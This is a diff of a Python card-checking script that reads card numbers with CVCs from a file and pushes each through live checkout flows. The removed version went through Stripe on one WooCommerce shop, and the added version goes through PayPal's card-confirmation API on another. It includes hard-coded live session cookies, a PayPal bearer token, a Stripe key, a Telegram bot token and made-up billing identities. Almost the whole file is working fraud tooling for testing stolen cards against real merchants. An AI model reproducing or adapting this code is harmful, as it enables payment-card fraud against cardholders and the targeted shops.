@@ -1,7 +1,6 @@
 import requests
-import os,re,time,random
-from user_agent import generate_user_agent
 import json
+import os,re,time,random
 
 file_path = 'cards.json'
 bot_token = "5556552193:AAGGN0Mfi22qYaennhcLc-lMmqLrwOmi5LY"
@@ -17,60 +16,131 @@ def process_cards(cards):
         for card in cards:
         	formatted_card = f"{card['num']}|{card['month']}|{card['year']}|{card['code']}"
         	nn, mm, yy, cvc = formatted_card.strip().split('|')
+        	if len(yy) == 2 and yy.isdigit():
+        		yy = "20" + yy
+        	elif len(yy) == 4 and yy.isdigit():
+       		 		pass
         	
+        	cookies = {
+    'real_cookie_banner-v:3_blog:1_path:eaca0d0-lang:ar': '1718370286%3A70a4721b-6913-4aed-95b7-8a1369b62c8e%3Afb8b4370a65c0bd6c85e68c38b697e15%3A%7B%2244%22%3A%5B604%2C603%2C602%2C598%5D%2C%2245%22%3A%5B601%5D%7D',
+    'wp_woocommerce_session_89d20ffda4774feff3515cbb8c545d3b': 't_1da28faf123df5488bb338d3f0b044%7C%7C1718545263%7C%7C1718541663%7C%7Cd5a8757c2669b4b72950cb2dab7d1193',
+    'woodmart_wishlist_count': '0',
+    'wishlist_cleared_time': '1718372650',
+    'woocommerce_items_in_cart': '1',
+    'woocommerce_cart_hash': '02e5304a052c64a7523bf1b33b8fc21d',
+
+    }
+    
         	headers = {
-    'authority': 'api.stripe.com',
-    'accept': 'application/json',
+    'authority': 'joudi-line.de',
+    'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,hi-IN;q=0.6,hi;q=0.5',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'referer': 'https://js.stripe.com/',
+    'content-type': 'application/json',
+    'origin': 'https://joudi-line.de',
+    'referer': 'https://joudi-line.de/checkout/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
+    'sec-fetch-site': 'same-origin',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+        	}
+        	params = {
+    'wc-ajax': 'ppc-create-order',
     }
-        	data = f'type=card&billing_details[name]=Ali+Mazen&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10010&billing_details[address][state]=NY&billing_details[email]=pjbxxxy%40telegmail.com&billing_details[phone]=0994488358&card[number]={nn}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=ba8f5f95-bf9d-47e2-8b0f-656ca8590a7d79f216&sid=NA&payment_user_agent=stripe.js%2F50ba0a1035%3B+stripe-js-v3%2F50ba0a1035%3B+split-card-element&referrer=https%3A%2F%2Fal-nadha.com&time_on_page=263992&key=pk_live_51HzoJkDhTL3jxamujcfGoKiSXVXVRxWTOBMWPHoaiwvPtvYdUjAoAn5dxRtYID8nJ2eJNdyTB2OJ8SQB6SlTJsqG005wLErA2T&_stripe_account=acct_1HzoJkDhTL3jxamu&_stripe_version=2022-08-01&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQaL3jPgLg7NblKeDOk-SuL39N9H3Gi4VTgkv0PMXcKIezTuD5_5K7riB18xnJcAm5LpcxbrbQfZCUeMgTETPNiZDJBFDtcYb8occuG_mhyWNhCRVepCMPKTXVW0FbBSU71uGMmo6NarssmYEGcIiLJXa7xMN23Df8L26q4MPRN82nmmYuCGyuliM1BUv27S2XOkOGQRZpMF9whs-mISiOOsWc_wrcyWuChaQX7qfpRPJWl6K2b8pyybfzqq_drexg3ljaqarYhIrHnGubpad7mfoFgQ6W0xj5x5nCd0Zk5nTCmrgMrUKopYkyVjC0VPzKZdgdWTkza-Iqxq012NTDzuHUMQzUSFMIQ2eeCdzrJ4plqhOPYvNHoXaJZDmNLVndjWhOGLvDu8hN618DmuhATZD5GLzFuOJTXUN5ubRR53OXFQZBC_6aeqJk-nuYTzXXTUoW0PW-j2wMtb_GOlh7qgWPd8bgS_DvrF2A61Pt8M-Yp_uWmsYfAsqsuZHaaiy9gnHUwugHQTmzzh4XtG9ap8TlpPREy46LHHqx-Z56InzvYjrT5F6b_zDMlCLbARmVhXHYFCzVVblMLBZ50_HZDoEmoaxzUqPJA-Nf5TCxxgJq0Y6mjw1gX03bCSLe6Z3EDTWQnyQsVaioBsJvGWlo64_viU6_0AKTTsEIGLH9O8ze6zFJL9OwUDmEOUBpgG6ULty8YxeDAFWGQUBAsRMxo-ZdJKLDWUP33tM43JswAhfsh8sD1XVvCfxfv3fCGu20qNNvnSft51XxwpdQuxgU5zMHKOks-C9AOgcy39BPdep33XUJu9EFo6oOp2cM6KLLhw_rrwn6pLBnvy6yMJQAnXTpcDcjO6Du3vxPdBy04SdSx1BX0-AdDagtRH8-sOEkygnC7TIp2ytgrvgK1f5FVDwF0CGUI8qGN7cv78VJZ-mn91vjZzc5o3ZF6GUj-F677ieEfebLSFXBZTrLMAnpk8UBSx_GNuAhYp6nY5eXdJLSsrGMzcZzCxLjxk2pYKrOU27L9QNu5tknuTd3hGbBl2jFwRmcE4u1g2OGBfhGG-sqmduveRsddFP3r6HLqSBBndNfVdUqdFi66G8F8EffWzL1nXxN6xc1M93n5_NVmOMw4yukusUFqk14W-xQibIVByKfAKxtW82Aq4IzfG4ApR5xQnw2t-hI8kVcKdnBtFu6m2ev4e9WteyIUqlNS924-vxQYpBhMvd9o5KJTROCdmojiwWmzdc-fAdXz7NFlsXEC1stn1by9fzogWt65QtoW-4geFZK9OSHH7WSuHA47DNxBhVYjHunAxw5D--4dT-eNOYVpR_iZsp99eBYHVhHs21ih0uZEaFfCKC7g00sbXheckwsx52UXSWeUInBx7e9srCvZ_IzCacm1yWBsP5u9-7j6PcSbJJ4NwMK-z9nEkVaWHoAWKvT5eNDefQ5FWPmSOPvcsNu9-tDgh8UXebjipGzIpe2d0OZXmOwAaOnFVFVPT1_RfFHTTraqNilKiwnGcMSYB8dxFMa7d4XkDaJJftOKjNGDwTD_zL_LI_Vr3iPCc8SGlcdZXP3GhOgjHSrqmgqdzSZ8Rz5S1XIj7eIZJQ8TgnBLlP-rHTY-KEgsUl0QMwdYufuVyGLykOqFqXCFseltjrehkwHP3PHbbyuYza5o-OPiTeB6qUU5vvpon5E4lHObtR0aRen5Sd1UeK_8SbMI-GR2hTCfhb1v6xa2b8ICaB_2y1KcpmVWxTHKU_kOFVs8MEVK2II1eFoFM-lsaFN9UNYrE5OXkbKowi09GDjA3Ekx3S2kQdsOfAnrVu8XkHuK3Ug_z8Cdiei7YNFrQTQaPnxN7qpzcOdSTRYFsRpMrrKOE2BTTo4Mkvq7sjWdFn4JLi14iNg86wsnqr5z3ANoR3CdqjNMcjjfXwNTUzhgkT8Yc31XMb7xqidbakj09LWQeCreV4ojrIYz-K5-LetA4BvHJoSXuffwfze-cXggUJ5DUQVgIIUx_ae2RVYnPkYks4nMdO5fwyzfAES6OQpNbxD7SWPe86H1nAEpm8wUvtJ94CanfCWC91WeZDQRo8OMFZ9XqhGuTsZJJkzGYzvK9K96Y1hS4gL0jEyKOAhOi2HazKHTtwEmDtjK3XTzVVxYdnGDepFUtId_qD6DPhP6mpQejAMHzFOp5Xlt2az_gc_VCQmqgJfecaXEiY4mHoA49yvsM2wzIkGdJr7LvLyqfFqwpWeaduaNleHDOZljthKhzaGFyZF9pZM4DMYNvomtyqDFmYjkxNTUxonBkAA.uuyI2b2EsKFmK_uEHi8ckl1dwUxxrZwVfHdqToygwBM'
-        	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-        	#print(response.json())
-        	pm = response.json()["id"]
+    
+    
+        	json_data = {
+    'nonce': '2d0acfe84e',
+    'payer': None,
+    'bn_code': 'Woo_PPCP',
+    'context': 'checkout',
+    'order_id': '0',
+    'payment_method': 'ppcp-credit-card-gateway',
+    'form_encoded': 'billing_first_name=Ahmad&billing_last_name=Jousm&billing_country=US&billing_address_1=New+York&billing_city=New+York&billing_postcode=10009&billing_phone=%2B12029908659&billing_email=klbjzzel%40hi2.in&payment_method=ppcp-credit-card-gateway&woocommerce-process-checkout-nonce=42a16df8d9&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review',
+    'createaccount': False,
+    'save_payment_method': True,
+    
+    }
+        	response = requests.post('https://joudi-line.de/', params=params, cookies=cookies, headers=headers, json=json_data)
         	
-        	
+        #	print(response.json())
+        	id = response.json()['data']['id']
+        	custom_id = response.json()['data']['custom_id']
+    ###
+    
         	cookies = {
-        	    '_fbp': 'fb.1.1718466730030.634617056251551572',
-    '_gid': 'GA1.2.1006701108.1718466733',
-    'wp_woocommerce_session_8181e73ab86fda8b24141304097755c5': 't_341ae88de80e73b971df3960b1c7d7%7C%7C1718639570%7C%7C1718635970%7C%7Ce9de48c1a588dd7dd6886188936ab047',
-    '_ga': 'GA1.2.1890779885.1718466731',
-    '_ga_701NGE5REB': 'GS1.1.1718466731.1.1.1718467176.0.0.0',
-    'mailpoet_subscriber': '%7B%22subscriber_id%22%3A43814%7D',
-    'wcaiocc_user_currency_session': 'EUR',
-    'PHPSESSID': 'ej32gve38lmvp0f5o737otefea',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-06-15%2017%3A19%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fal-nadha.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fal-nadha.com%2Fshop%2Funits%2Funits%2F',
-    'sbjs_first_add': 'fd%3D2024-06-15%2017%3A19%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fal-nadha.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fal-nadha.com%2Fshop%2Funits%2Funits%2F',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+    'l7_az': 'dcg16.slc',
+    'ts_c': 'vr%3D1b2213f51900a5521880d34cff53aa2e%26vt%3D1b2213f51900a5521880d34cff53aa2d',
+    'enforce_policy': 'ccpa',
+    'LANG': 'en_US%3BUS',
+    'rssk': 'd%7DC9%407%3B9962%3E6%3BA7%3Exqx%3Eyyixg6%3A%3C%3F19',
+    'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'FqqCxrwx0jNJ3AmJ_vuamgRDEokZL8o8Hu3A9eJUDO3Po2P6vTGQ0Ff8IrinmRw7x5MFeYhCv6GKgU-5',
+    'sc_f': 'LoKS2TE5NvuTVLHoF56M3Vc4QzRdX7tLd1k6QyY_SHsY7i48j-0iSFUlrQ_ogsIXXcDkx1vcBuEAPCMIAUPVA0_7eNnlilCBlJ5h2m',
+    'tsrce': 'loggernodeweb',
+    'x-pp-s': 'eyJ0IjoiMTcxODQ0MjcwNDIzMiIsImwiOiIwIiwibSI6IjAifQ',
+    'ts': 'vreXpYrS%3D1813050704%26vteXpYrS%3D1718444504%26vr%3D1b2213f51900a5521880d34cff53aa2e%26vt%3D1b2213f51900a5521880d34cff53aa2d%26vtyp%3Dnew',
+}
+   
+        	headers = {
+    'authority': 'www.paypal.com',
+    'accept': 'application/json',
+    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,hi-IN;q=0.6,hi;q=0.5',
+    'authorization': 'Bearer A21AANKwj9zsLccHZ_jvucZoqQwS46CU3b9iCJA7VH1l8Kv_dAxaswOqhm6-Dg1HQV0v_sTdfsSDFBNLAy44lXeaRT9JXf5gw',
+    'content-type': 'application/json',
+    'origin': 'https://www.paypal.com',
+    'paypal-client-metadata-id': 'uid_20a1359d52_mdy6mda6mzq',
+    'paypal-partner-attribution-id': '',
+    'prefer': 'return=representation',
+    'referer': 'https://www.paypal.com/smart/card-field?style.input.appearance=none&style.input.color=rgb(119%2C%20119%2C%20119)&style.input.direction=rtl&style.input.font-family=Tajawal%2C%20Arial%2C%20Helvetica%2C%20sans-serif&style.input.font-size=14px&style.input.font-stretch=100%25&style.input.font-style=normal&style.input.font-variant=normal&style.input.font-variant-alternates=normal&style.input.font-variant-caps=normal&style.input.font-variant-east-asian=normal&style.input.font-variant-ligatures=normal&style.input.font-variant-numeric=normal&style.input.font-weight=400&style.input.letter-spacing=normal&style.input.line-height=22.4px&style.input.opacity=1&style.input.padding-bottom=0px&style.input.padding-left=15px&style.input.padding-right=15px&style.input.padding-top=0px&style.input.text-shadow=none&style.input.-webkit-tap-highlight-color=rgba(0%2C%200%2C%200%2C%200)&type=expiry&clientID=BAAJK3yaJelN7EXxZWh9TwNm8K6gKP-G51Sk6TKJUXicSXW6Nll1Q53J_zaQEmEZMhbGEgn0jzfqPNO9wg&sessionID=uid_20a1359d52_mdy6mda6mzq&clientMetadataID=uid_20a1359d52_mdy6mda6mzq&cardFieldsSessionID=uid_c6fb43685c_mdy6mdm6mju&env=production&debug=false&locale.country=US&locale.lang=en&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QkFBSkszeWFKZWxON0VYeFpXaDlUd05tOEs2Z0tQLUc1MVNrNlRLSlVYaWNTWFc2TmxsMVE1M0pfemFRRW1FWk1oYkdFZ24wanpmcVBOTzl3ZyZjdXJyZW5jeT1FVVImaW50ZWdyYXRpb24tZGF0ZT0yMDI0LTA0LTAzJmNvbXBvbmVudHM9YnV0dG9ucyxmdW5kaW5nLWVsaWdpYmlsaXR5LGNhcmQtZmllbGRzJnZhdWx0PWZhbHNlJmNvbW1pdD10cnVlJmludGVudD1jYXB0dXJlJmVuYWJsZS1mdW5kaW5nPXZlbm1vLHBheWxhdGVyIiwiYXR0cnMiOnsiZGF0YS1wYXJ0bmVyLWF0dHJpYnV0aW9uLWlkIjoiV29vX1BQQ1AiLCJkYXRhLXVpZCI6InVpZF9xd2dpc3FybnNjeXNpcXlhcXFjeXljZnZqYnN1eHIifX0&disable-card=&currency=EUR&intent=capture&commit=true&vault=false&sdkCorrelationID=f7157221e977b',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    
+    }
+    
+        	json_data = {
+    'payment_source': {
+        'card': {
+            'number': f'{nn}',
+            'security_code': f'{cvc}',
+            'expiry': f'{yy}-{mm}',
+            },
+        },
+    }
+    
+        	response = requests.post(
+    f'https://www.paypal.com/v2/checkout/orders/{id}/confirm-payment-source',
+    cookies=cookies,
+    headers=headers,
+    json=json_data,
+    )
+    
+    #print(response.json())
+    ###
+    
+        	cookies = {
+    'real_cookie_banner-v:3_blog:1_path:eaca0d0-lang:ar': '1718370286%3A70a4721b-6913-4aed-95b7-8a1369b62c8e%3Afb8b4370a65c0bd6c85e68c38b697e15%3A%7B%2244%22%3A%5B604%2C603%2C602%2C598%5D%2C%2245%22%3A%5B601%5D%7D',
+    'wp_woocommerce_session_89d20ffda4774feff3515cbb8c545d3b': 't_1da28faf123df5488bb338d3f0b044%7C%7C1718545263%7C%7C1718541663%7C%7Cd5a8757c2669b4b72950cb2dab7d1193',
+    'woodmart_wishlist_count': '0',
+    'wishlist_cleared_time': '1718372650',
     'woocommerce_items_in_cart': '1',
-    'woocommerce_cart_hash': '548c6e177e54b8a870fb6eb16d85f8c5',
-    'woocommerce_recently_viewed': '537',
-    'mailpoet_page_view': '%7B%22timestamp%22%3A1718472210%7D',
-    'sbjs_session': 'pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fal-nadha.com%2Fcheckout%2F',
-
-
+    'woocommerce_cart_hash': '02e5304a052c64a7523bf1b33b8fc21d',
 }
     
 
         	headers = {
-    'authority': 'al-nadha.com',
+    'authority': 'joudi-line.de',
     'accept': 'application/json, text/javascript, */*; q=0.01',
     'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,hi-IN;q=0.6,hi;q=0.5',
     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://al-nadha.com',
-    'referer': 'https://al-nadha.com/checkout/',
+    'origin': 'https://joudi-line.de',
+    'referer': 'https://joudi-line.de/checkout/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -81,60 +151,28 @@ def process_cards(cards):
     'x-requested-with': 'XMLHttpRequest',
     }
     
-    
         	params = {
     'wc-ajax': 'checkout',
     }
     
+
         	data = {
-    'billing_first_name': 'Ali',
-    'billing_last_name': 'Mazen',
+    'billing_first_name': 'Ahmad',
+    'billing_last_name': 'Jousm',
     'billing_country': 'US',
     'billing_address_1': 'New York',
-    'billing_postcode': '10010',
     'billing_city': 'New York',
-    'billing_state': 'NY',
-    'billing_phone': '0994488358',
-    'billing_email': 'pjbxxxy@telegmail.com',
-    'createaccount': '1',
-    'order_comments': '',
-    'wc_order_attribution_source_type': 'typein',
-    'wc_order_attribution_referrer': '(none)',
-    'wc_order_attribution_utm_campaign': '(none)',
-    'wc_order_attribution_utm_source': '(direct)',
-    'wc_order_attribution_utm_medium': '(none)',
-    'wc_order_attribution_utm_content': '(none)',
-    'wc_order_attribution_utm_id': '(none)',
-    'wc_order_attribution_utm_term': '(none)',
-    'wc_order_attribution_session_entry': 'https://al-nadha.com/#',
-    'wc_order_attribution_session_start_time': '2024-06-15+17:19:31',
-    'wc_order_attribution_session_pages': '14',
-    'wc_order_attribution_session_count': '1',
-    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    'wc-points-rewards-max-points': '0',
-    'payment_method': 'stripe_cc',
-    'stripe_cc_token_key': pm,
-    'stripe_cc_payment_intent_key': '',
-    'stripe_cc_save_source_key': 'yes',
-    'stripe_ideal_token_key': '',
-    'stripe_ideal_payment_intent_key': '',
-    'stripe_bancontact_token_key': '',
-    'stripe_bancontact_payment_intent_key': '',
-    'stripe_giropay_token_key': '',
-    'stripe_giropay_payment_intent_key': '',
-    'stripe_sofort_token_key': '',
-    'stripe_sofort_payment_intent_key': '',
-    'mailpoet_woocommerce_checkout_optin_present': '1',
-    'terms': 'on',
-    'terms-field': '1',
-    'woocommerce-process-checkout-nonce': '53751511da',
-    '_wp_http_referer': '/?wc-ajax=update_order_review'
-    
+    'billing_postcode': '10009',
+    'billing_phone': '+12029908659',
+    'billing_email': 'klbjzzel@hi2.in',
+    'payment_method': 'ppcp-credit-card-gateway',
+    'woocommerce-process-checkout-nonce': 'f41b69fa34',
+    '_wp_http_referer': '/?wc-ajax=update_order_review',
+    'ppcp-resume-order': custom_id,
     }
     
-    
-
-        	response = requests.post('https://al-nadha.com/', params=params, cookies=cookies, headers=headers, data=data)
+        	response = requests.post('https://joudi-line.de/', params=params, cookies=cookies, headers=headers, data=data)
+        	print(response.json())
         	html_message = response.json()["messages"]
         	cleanr = re.compile('<.*?>')
         	cleanmessage = re.sub(cleanr, '', html_message)
